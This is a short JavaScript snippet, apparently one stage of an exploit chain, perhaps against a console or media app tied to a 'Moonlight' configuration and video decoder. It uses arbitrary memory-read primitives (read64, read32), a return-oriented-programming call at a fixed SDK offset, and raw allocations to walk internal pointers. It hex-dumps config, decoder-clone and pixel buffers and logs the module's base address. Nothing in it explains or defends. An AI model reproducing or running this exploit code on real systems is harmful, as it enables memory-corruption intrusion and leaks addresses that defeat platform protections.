(async function(){
 var P=window.__moonlightConfigProbe,N=P.N,info=malloc(64),page=malloc(8);
 function range(p,n){if(call_rop(sdk_base+0x168b0cn,info,page,p)&0x3fffffn)throw Error('Query failed');if(!(read32(info+24n)&1n)||p<read64(info)||p+BigInt(n+4)>read64(info)+read64(info+8n))throw Error('Range rejected');}
 function hex(b){return Array.from(b,function(x){return ('0'+x.toString(16)).slice(-2);}).join('');}
 async function data(label,p,n){range(p,n);await log('MOONLIGHT_CONFIG_BUFFER: '+JSON.stringify({label:label,address:p.toString(16),hex:hex(N.copyFrom(p,n))}));}
 var root=read64(P.config);range(root,0x608);var value=read64(root+0x180n);await data('avcc-value',value,24);var buffer=read64(value+8n);await data('avcc-buffer',buffer,64);

 var implementation=read64(P.decoder+8n);range(implementation+0x190n,8);var clone=read64(implementation+0x190n);range(clone,0x608);var cv=read64(clone+0x180n);await data('clone-value',cv,24);var cb=read64(cv+8n);await data('clone-buffer',cb,64);
 var originalData=read64(buffer+0x28n),cloneData=read64(cb+0x28n);await data('original-pixels',originalData,40);await data('clone-pixels',cloneData,40);
 await log('MOONLIGHT_CONFIG_BASE: '+N.movieBase.toString(16));
 free(page);free(info);
})();
